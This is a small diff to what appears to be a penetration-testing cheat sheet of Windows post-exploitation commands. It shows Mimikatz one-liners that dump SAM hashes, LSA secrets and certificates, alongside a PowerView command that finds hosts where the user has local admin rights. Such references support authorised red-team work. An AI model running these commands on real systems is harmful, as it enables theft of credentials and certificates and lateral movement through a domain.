@@ -163,7 +163,7 @@ token::elevate
 lsadump::sam SamBkup.hiv SystemBkup.hiv
 ```
 
-#### Mimikatz dump lsa (krbtgt to)
+#### Mimikatz dump lsass
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
@@ -172,6 +172,11 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 #### Powerview
 ```
 Find-LocalAdminAccess -Verbose
+```
+
+#### Mimikatz dump certs
+```
+Invoke-Mimikatz –DumpCerts
 ```
 
 ### Other scripts
